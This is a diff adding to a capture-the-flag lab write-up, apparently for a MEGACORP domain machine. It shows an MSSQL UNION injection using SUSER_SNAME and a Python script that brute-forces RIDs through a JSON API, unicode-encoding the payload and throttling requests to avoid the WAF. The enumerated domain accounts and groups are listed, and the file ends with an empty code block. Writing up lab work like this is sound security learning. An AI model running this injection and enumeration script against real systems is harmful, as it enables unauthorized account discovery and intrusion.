@@ -245,6 +245,23 @@ hello\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0
 ![[Pasted image 20240922042724.png]]
 
 
+Let's break down this 
+56 Bytes
+```
+0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000
+```
+
+48 bytes are the SID
+```
+0x0105000000000005150000001c00d1bcd181f1492bdfc236
+```
+
+8 bytes are the RID
+```
+0x00020000
+```
+
+
 ```
 ' UNION SELECT 1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),3,4,5--
 ```
@@ -262,3 +279,81 @@ hello\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0
 MEGACORP\\Administrator
 ```
 
+
+Let's automate this process
+```
+import json
+import requests
+from time import sleep
+
+url = 'http://10.129.247.110/api/getColleagues'
+
+# Encode our payload
+def encode_me(str):
+    val = []
+    for i in str:
+        val.append("\\u00"+hex(ord(i)).split("x")[1])
+    
+    return ''.join([i for i in val])
+
+# Iterate RID
+sid = ''
+for i in range(500,10000):
+    i = hex(i)[2:].upper()
+    if len(i) < 4:
+        i = '0' + i
+
+    # Reverse our RID
+    t = bytearray.fromhex(i)
+    t.reverse()
+    t = ''.join(format(x,'02x') for x in t).upper()+'0'*4
+
+    # Build the request
+    sid = '0x0105000000000005150000001c00d1bcd181f1492bdfc236{}'.format(t)
+    payload = "hello' UNION SELECT 1,SUSER_SNAME({}),3,4,5--".format(sid)  
+    r = requests.post(url,data='{"name":"'+ encode_me(payload) + '"}',headers={'Content-Type': 'Application/json'})
+
+    user = json.loads(r.text)[0]["name"]
+
+    if user:
+        print(user)
+
+    # Sleep to avoid triggering the WAF
+    sleep(3)
+```
+
+
+So only thing to keep in mind like when i got the password i rushed to use it with the userlist i got and wasted my time.
+
+Instead there was another SQL injection which we got to know. Only thing to keep in mind is think out of the box.
+
+```
+MEGACORP\Administrator
+MEGACORP\Guest
+MEGACORP\krbtgt
+MEGACORP\DefaultAccount
+MEGACORP\Domain Admins
+MEGACORP\Domain Users
+MEGACORP\Domain Guests
+MEGACORP\Domain Computers
+MEGACORP\Domain Controllers
+MEGACORP\Cert Publishers
+MEGACORP\Schema Admins
+MEGACORP\Enterprise Admins
+MEGACORP\Group Policy Creator Owners
+MEGACORP\Read-only Domain Controllers
+MEGACORP\Cloneable Domain Controllers
+MEGACORP\Protected Users
+MEGACORP\Key Admins
+MEGACORP\Enterprise Key Admins
+MEGACORP\RAS and IAS Servers
+MEGACORP\Allowed RODC Password Replication Group
+MEGACORP\Denied RODC Password Replication Group
+```
+![[Pasted image 20240924020635.png]]
+
+
+Let's try the password here.
+```
+
+```
